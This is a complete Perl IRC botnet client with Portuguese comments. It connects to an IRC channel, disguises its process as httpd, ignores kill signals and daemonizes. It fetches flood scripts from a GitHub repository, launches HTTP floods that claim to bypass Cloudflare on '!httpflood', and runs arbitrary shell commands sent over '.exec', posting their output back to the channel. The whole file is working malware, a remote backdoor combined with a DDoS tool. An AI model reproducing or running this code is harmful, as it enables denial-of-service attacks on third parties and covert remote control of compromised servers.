#!usr/bin/perl

use IO::Socket;
my $processo = '/usr/sbin/httpd';
my $server  = "irc.freenode.net"; 
my $code = int(rand(100000));
my $channel = "#hyakimaro";
my $port    = "6667";
my $nick    = "Linux-$code"; #$code vai gerar um número aleatório#

# for bypass cloudflare #
unless (-e "cc.py") {
  print "[*] Instalando...";
  system("wget https://raw.githubusercontent.com/Paulo0819/irc-linux/main/cc.py && wget https://raw.githubusercontent.com/Paulo0819/irc-linux/main/socks.py && wget https://raw.githubusercontent.com/Paulo0819/irc-linux/main/sockshandler.py");
}

all();
sub all {
$SIG{'INT'}  = 'IGNORE';
$SIG{'HUP'}  = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'}   = 'IGNORE';

$s0ck3t = new IO::Socket::INET(
PeerAddr => $server,
PeerPort => $port,
Proto    => 'tcp'
);
if ( !$s0ck3t ) {
print "\nError\n";
exit 1;
}   

$0 = "$processo" . "\0" x 16;
my $pid = fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);

print $s0ck3t "NICK $nick\r\n";
print $s0ck3t "USER $nick 1 1 1 1\r\n";

while ( my $log = <$s0ck3t> ) {
      chomp($log);

      if ( $log =~ m/^PING(.*)$/i ) {
        print $s0ck3t "PONG $1\r\n";
	print $s0ck3t "JOIN $channel\r\n";
      }

      if ( $log =~ m/:!httpflood (.*)$/g ){##########
        my $target_cf = $1;
        $target_cf =~ s/^\s*(.*?)\s*$/$1/;
        print $s0ck3t "PRIVMSG $channel :67[63BYPASS67]61 Attack started at $1!\r\n";
        system("python3 cc.py cc $target_cf n 5 999 y socks5.txt n 2000 y > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!stopflood/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63BYPASS67]61 Attack sucessfully finished! \r\n";
        system("pkill -f -9 python3");
      }

      if ( $log =~ m/:.exec (.*)$/g ){##########
        my $comando_raw = `$1`;
        open(handler,">mat.tmp");
        print handler $comando_raw;
        close(handler);
	
        open(h4ndl3r,"<","mat.tmp");
        my @commandoarray = <h4ndl3r>;

        foreach my $comando_each (@commandoarray){
          sleep(1);
          print $s0ck3t "PRIVMSG $channel :$comando_each \r\n";
       }
   }
}
}
while(true){
  all();
}
